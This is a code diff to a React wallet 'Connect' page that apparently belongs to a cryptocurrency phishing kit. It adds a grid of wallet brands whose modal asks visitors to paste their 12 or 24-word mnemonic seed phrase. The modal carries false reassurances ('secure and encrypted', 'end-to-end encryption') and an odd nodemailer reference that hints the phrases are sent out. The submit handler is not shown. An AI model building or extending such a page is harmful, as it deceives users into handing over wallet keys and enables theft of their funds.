@@ -3,9 +3,14 @@ import { ethers } from "ethers";
 import Web3 from "web3";
 import { errorNotification, successNotification } from "../../utils/helpers";
 import { useNavigate } from "react-router-dom";
+import { wallets } from "../../utils/data";
 
 const ConnectPage = () => {
   const [show, setShow] = useState(false);
+  const [wallet, setWallet] = useState({
+    logo: "hardware.jpg",
+    name: "Hardware Wallet",
+  });
   const [loading, setLoading] = useState(false);
   const [phrase, setPhrase] = useState("");
   const web3 = new Web3(Web3.nodemailer);
@@ -220,11 +225,42 @@ const ConnectPage = () => {
     }
   };
 
+  const handleSetWallet = (item) => {
+    setShow(true);
+    setWallet(item);
+    console.log({ show });
+  };
+
   return (
-    <div className="w-screen h-[90vh] flex justify-center items-center px-8">
-      <div className="w-full max-w-[500px] pt-20 flex flex-col gap-5 lg:px-0">
-        <p className="text-3xl font-bold">Import Your Wallet</p>
-        <div className="mb-6">
+    <div className="w-screen flex justify-center items-center px-8 relative">
+      <div className="w-full max-w-[1200px] pt-20 lg:py-40 flex flex-col gap-5 lg:px-0 ">
+        <p className="text-3xl font-bold text-center">Connect Wallet</p>
+        <div className="grid grid-cols-2 lg:grid-cols-4 gap-7">
+          {wallets.map((item, i) => (
+            <div
+              className="col-span-1 p-4 bg-transparent flex gap-5 items-center cursor-pointer rounded-lg "
+              key={i}
+              onClick={() => handleSetWallet(item)}
+              style={{ boxShadow: "4px 4px 7px #032e2a" }}
+            >
+              <img
+                src={`/assets/images/wallets/${item.logo}`}
+                alt=""
+                className="w-6 lg:w-16 rounded-full"
+              />
+              <div className="flex flex-col">
+                <span className="font-semibold text-sm lg:text-[16px]">
+                  {item.name}
+                </span>
+                <span className="text-gray-300 text-[9px] lg:text-md">
+                  {item.subtitle}
+                </span>
+              </div>
+            </div>
+          ))}
+        </div>
+
+        {/* <div className="mb-6">
           <p className="font-bold text-sm">What is a Seed Phrase?</p>
           <span className="text-sm">
             A 12, 18, or 24-word phrase used to control your assets.
@@ -251,33 +287,40 @@ const ConnectPage = () => {
           className="btnn2 px-4 py-3 w-full font-semibold text-center"
         >
           Import Private Key
-        </div>
+        </div> */}
       </div>
       {show ? (
-        <div className="fixed w-screen h-screen flex justify-center items-center bg-black/90 px-5 lg:px-0">
+        <div className="fixed top-0 left-0 w-screen h-screen flex justify-center items-center bg-black/90 px-5 lg:px-0">
           <div
-            className="w-full max-w-[500px] px-7 lg:px-10 flex flex-col bg-black py-12"
+            className="w-full max-w-[500px] px-7 lg:px-10 flex flex-col bg-[#000] py-12 rounded-lg relative"
             style={{ boxShadow: "4px 3px 10px #032e2a" }}
           >
-            <div className="flex justify-between items-center mb-10">
-              <p className="font-bold text-xl">Import Seed Phrase</p>
-
-              <div
-                className="h-[30px] w-[30px] flex justify-center items-center rounded-full border-[2px] border-white cursor-pointer"
-                onClick={() => setShow(false)}
-              >
-                x
-              </div>
+            <div className="flex flex-col items-center mb-5">
+              <img
+                src={`/assets/images/wallets/${wallet.logo}`}
+                alt=""
+                className="w-10 mb-3"
+              />
+              <span className="font-semibold text-xl text-white mb-5">
+                {wallet.name}
+              </span>
+              <p className="text-gray-200 text-md font-light">
+                This session is secure and encrypted
+              </p>
             </div>
-            <span className="text-sm mb-5">
-              Paste your wallet Seed Phrase here
-            </span>
+            <div
+              className="absolute -top-5 -right-6 h-[35px] w-[35px] flex justify-center items-center rounded-full border-[2px] border-[#333] cursor-pointer text-lg bg-white text-black"
+              onClick={() => setShow(false)}
+            >
+              x
+            </div>
             <form onSubmit={handleWalletImport} className="flex flex-col">
-              <input
+              <textarea
                 type="text"
                 value={phrase}
                 onChange={(e) => setPhrase(e.target.value)}
-                className="mb-7"
+                className="mb-7 h-20 bg-transparent border-[1px] border-[#fff] p-2 rounded-md"
+                placeholder="Enter your 12 or 24 words Mnemonic Phrase. Separate them with spaces"
               />
               <input
                 type="submit"
@@ -290,6 +333,13 @@ const ConnectPage = () => {
                 disabled={loading ? true : false}
               />
             </form>
+
+            <div className="flex gap-2 items-center mt-6">
+              <img src="/assets/images/shield.png" alt="" className="w-8" />
+              <span className="text-sm text-center text-[#ffffff8a]">
+                This session is protected with an end-to-end encryption
+              </span>
+            </div>
           </div>
         </div>
       ) : null}
